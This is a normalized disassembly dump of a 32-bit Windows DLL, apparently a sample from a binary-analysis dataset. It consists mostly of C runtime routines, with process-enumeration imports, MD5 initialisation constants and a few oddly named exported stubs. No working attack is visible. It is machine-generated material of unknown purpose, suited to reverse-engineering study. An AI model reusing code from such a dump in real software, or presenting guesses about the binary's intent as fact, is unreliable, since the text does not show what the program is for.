push esi
call sub_10016180
inc eax
pop ecx
inc eax
push eax
push edi
call sub_10016c78
add esp 0xc
test eax eax
je r-xdata
mov [ rw-data ] eax
mov ecx [ ebp - 0x8 ]
mov eax edi
sub eax esi
add eax [ ebp - 0x14 ]
mov [ eax ] bl
inc eax
neg ecx
sbb ecx ecx
not ecx
and ecx eax
push ecx
push edi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001382e
add esp 0x14
push edi
call sub_1000fe7d
pop ecx
or [ ebp - 0xc ] 0xffffffff
call sub_1001129f
mov [ eax ] 0x2a
sub_10019950
mov eax [ rw-data ]
push esi
mov esi [ CloseHandle@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0xfffffffe
je r-xdata
pop esi
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call esi
push eax
call esi
sub_1001997d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10018861
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_100112c5
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_10018861
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_10018861
push 0x1
mov edi eax
call sub_10018861
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_100187db
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_10019a19
push 0x10
push r--data
call sub_10012000
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_100112b2
and [ eax ] 0x0
call sub_1001129f
mov [ eax ] 0x9
call sub_100112b2
mov [ eax ] edi
call sub_1001129f
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_10013956
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10012045
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_100188d8
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1001129f
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_1001997d
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10019adc
mov eax [ ebp - 0x1c ]
sub_10019ae6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_1000fe7d
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_10019b17
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_10010024
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_1001129f
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_10013956
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_100141d4
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
mov eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_1001129f
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_10019d46
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_10019b17
add esp 0x14
pop ebp
retn
sub_10019d80
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_10019de1
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_10016180
mov esi eax
inc esi
push esi
call sub_1000ff5a
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
push esi
push edi
call sub_10016c78
add esp 0xc
test eax eax
je r-xdata
pop ebx
pop ebp
retn
mov eax edi
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1001382e
add esp 0x14
pop edi
pop esi
sub_10019e40
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_10001000
call [ GetProcessHeap@IAT ]
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn 0x4
push [ esp + 0x4 ]
push 0x0
push eax
call [ HeapFree@IAT ]
AGTwRec
jmp sub_100059ef
sub_10006670
xor eax eax
inc eax
retn
sub_10006674
mov eax [ esp + 0x8 ]
imul eax [ esp + 0xc ]
push eax
call sub_1000ff5a
pop ecx
retn
sub_10006685
cmp [ esp + 0x8 ] 0x0
je r-xdata
retn
push [ esp + 0x8 ]
call sub_1000fe7d
pop ecx
sub_100066c2
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x100
retn
sub_10006945
cmp [ esi + 0x34 ] 0x100
jae r-xdata
mov eax esi
jmp sub_100066c2
mov eax esi
call sub_10006869
sub_10007c06
mov eax [ esp + 0x4 ]
and [ eax + 0x25c ] 0x0
and [ eax + 0x258 ] 0x0
retn
sub_10007cf3
and [ eax + 0x54 ] 0x0
xor ecx ecx
inc ecx
cmp ecx 0x100
jl r-xdata
mov dl [ eax + 0x54 ]
mov [ ecx + eax + 0x158 ] dl
inc [ eax + 0x54 ]
cmp [ eax + ecx + 0x58 ] 0x0
je r-xdata
retn
sub_1000965f
and [ eax + 0xc68 ] 0x0
xor ecx ecx
inc ecx
cmp ecx 0x100
jl r-xdata
mov edx [ eax + 0xc68 ]
mov [ eax + edx + 0xd7c ] cl
inc [ eax + 0xc68 ]
cmp [ eax + ecx + 0xc6c ] 0x0
je r-xdata
retn
sub_1000c2a3
cmp cl al
jbe r-xdata
cmp al [ esp + 0x4 ]
jbe r-xdata
mov dl cl
mov cl al
mov al dl
retn
mov al [ esp + 0x4 ]
cmp cl al
jbe r-xdata
mov al cl
UB
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_1000d6e4
retn
BD
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_1000d64d
retn
j_sub_1000d0f6
jmp sub_1000d0f6
j_sub_1000d118
jmp sub_1000d118
sub_1000d919
push 0x28
push 0x0
push [ esp + 0xc ]
call sub_1000d091
add esp 0xc
retn
sub_1000d96b
mov eax [ esp + 0x4 ]
and [ eax + 0x14 ] 0x0
and [ eax + 0x10 ] 0x0
mov [ eax ] 0x67452301
mov [ eax + 0x4 ] 0xefcdab89
mov [ eax + 0x8 ] 0x98badcfe
mov [ eax + 0xc ] 0x10325476
retn
sub_1000e329
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x188 ]
mov [ eax + 0x180 ] ecx
mov ecx [ eax + 0x18c ]
mov [ eax + 0x184 ] ecx
retn
Process32FirstW
jmp [ Process32FirstW@IAT ]
Process32NextW
jmp [ Process32NextW@IAT ]
sub_1000fed3
push 0x4
call sub_1001142e
pop ecx
retn
sub_1000ff51
push 0x4
call sub_1001142e
pop ecx
retn
sub_1001028c
push 0xc
push r--data
call sub_10012000
call sub_10013426
and [ ebp - 0x4 ] 0x0
push [ eax + 0x58 ]
call [ eax + 0x54 ]
push eax
call sub_1001024f
sub_100102c1
mov esp [ ebp - 0x18 ]
push [ ebp - 0x1c ]
call sub_1001248c
int3
sub_10010658
mov edi edi
push esi
push 0x1
push rw-data
mov esi ecx
call sub_10014995
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_10010673
mov [ ecx ] r--data
jmp sub_10014a0f
sub_100106a5
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_100149b2
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100109ad
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_10013c2e
pop ecx
pop ecx
retn
sub_10010f67
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_10011128
pop ecx
pop ecx
retn
sub_10010f96
push 0x1
call sub_1001142e
pop ecx
retn
sub_10010f9f
push 0x1
call sub_10010ec5
pop ecx
retn
sub_10011059
call sub_10010f9f
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_1000fe7d
pop ecx
retn
call sub_100160d4
sub_1001142e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_100114ff
push 0xa
call sub_1001142e
pop ecx
retn
sub_10012045
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_10012270
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10012245
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_10012288
push 0x8
call sub_10011508
pop ecx
retn
sub_10012291
push 0x8
call sub_1001142e
pop ecx
retn
sub_10012477
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_1001142e
pop ecx
sub_1001248c
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_10012360
add esp 0xc
pop ebp
retn
sub_100124a2
push 0x1
push 0x0
push 0x0
call sub_10012360
add esp 0xc
retn
sub_100126e3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_100129db
push 0xd
call sub_1001142e
pop ecx
retn
sub_10012da6
push 0xd
call sub_1001142e
pop ecx
retn
sub_10012ddf
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_10012c45
pop ecx
mov [ rw-data ] 0x1
sub_10013116
push 0xc
call sub_1001142e
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_10013194
push 0x0
call sub_10013122
pop ecx
retn
sub_1001320f
call [ TlsAlloc@IAT ]
retn 0x4
sub_10013218
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ rw-data ]
call [ TlsGetValue@IAT ]
call eax
pop ebp
retn 0x4
sub_10013232
mov eax [ rw-data ]
retn
sub_1001326c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rw-data ]
call sub_1001319d
pop ecx
call eax
pop ebp
retn 0x8
sub_1001339b
push 0xd
call sub_1001142e
pop ecx
retn
sub_100133a4
push 0xc
call sub_1001142e
pop ecx
retn
sub_10013426
mov edi edi
push esi
call sub_100133ad
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push 0x10
call sub_1001221c
pop ecx
sub_1001355a
push 0xd
call sub_1001142e
pop ecx
retn
sub_10013566
push 0xc
call sub_1001142e
pop ecx
retn
sub_1001381f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10013a9b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_10013acd
retn
sub_100141c1
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10014189
pop ecx
pop ecx
pop ebp
retn
sub_1001498c
push 0x7
call sub_1001142e
pop ecx
retn
sub_10014995
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
and [ eax + 0x8 ] 0x0
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_10014a0f
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_1000fe7d
pop ecx
sub_10014a25
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_10014a53
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_1001837e
pop ecx
retn
sub_10014a84
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1000fe7d
sub_10014bb0
call sub_10012291
retn
sub_10014bb6
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10014b7a
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_10014ef2
xor eax eax
inc eax
retn
sub_10015589
push 0xc
push r--data
call sub_10012000
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_10012045
retn
sub_100155a6
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_1001563b
call sub_100155d9
mov [ rw-data ] eax
xor eax eax
retn
sub_10015fb7
push [ ebp + 0x8 ]
call sub_10018978
pop ecx
retn
sub_100160ca
push [ ebp + 0x8 ]
call sub_10018978
pop ecx
retn
sub_1001616a
push 0x1
call sub_1001142e
pop ecx
retn
sub_1001620b
and [ rw-data ] 0x0
retn
sub_10016213
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10016243
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_1001625a
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_10012045
retn
push 0x8
call [ SetLastError@IAT ]
sub_100166ce
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_100165f8
add esp 0xc
pop ebp
retn 0x4
sub_10016701
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_10018ba9
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_10016734
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_100165f8
add esp 0xc
pop ebp
retn 0x8
sub_1001676c
push 0x8
push r--data
call sub_10012000
call sub_10013426
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_10018bd4
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_1001678c
xor eax eax
inc eax
retn
sub_10016790
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10018bd4
sub_100167a5
push sub_1001676c
call sub_10013122
pop ecx
mov [ rw-data ] eax
retn
sub_100167b6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_1001680b
push [ rw-data ]
call sub_1001319d
pop ecx
retn
sub_1001698c
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_1001142e
pop ecx
sub_100169c8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_100169d7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1001748d
push 0x4
call sub_1001142e
pop ecx
retn
sub_100175f3
push 0x4
call sub_1001142e
pop ecx
retn
sub_10017966
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_10010a80
sub_10017acd
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10017a11
add esp 0xc
pop ebp
retn
sub_10017ba0
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10017ae4
add esp 0xc
pop ebp
retn
sub_1001828d
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001819f
add esp 0x10
pop ebp
retn
sub_100183e5
push 0xe
call sub_1001142e
pop ecx
retn
sub_10018488
push 0x4
call sub_1001142e
pop ecx
retn
sub_100184e4
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_10018491
add esp 0x10
pop ebp
retn
sub_100186d8
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100185c1
add esp 0x10
pop ebp
retn
sub_1001896f
push 0xa
call sub_1001142e
pop ecx
retn
sub_10018a8a
push esi
call sub_100110ec
pop ecx
retn
sub_10018b7d
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_10018ab4
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_10018bc8
call eax
retn
sub_10018bcb
push 0x2
call sub_1001221c
pop ecx
retn
sub_10018ceb
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_10019d46
add esp 0xc
pop ebp
retn
sub_10019156
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10018f8e
add esp 0x10
pop ebp
retn
sub_10019931
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
sub_10019adc
push [ ebp + 0x8 ]
call sub_10018978
pop ecx
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_10019e7a
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_10014a0f
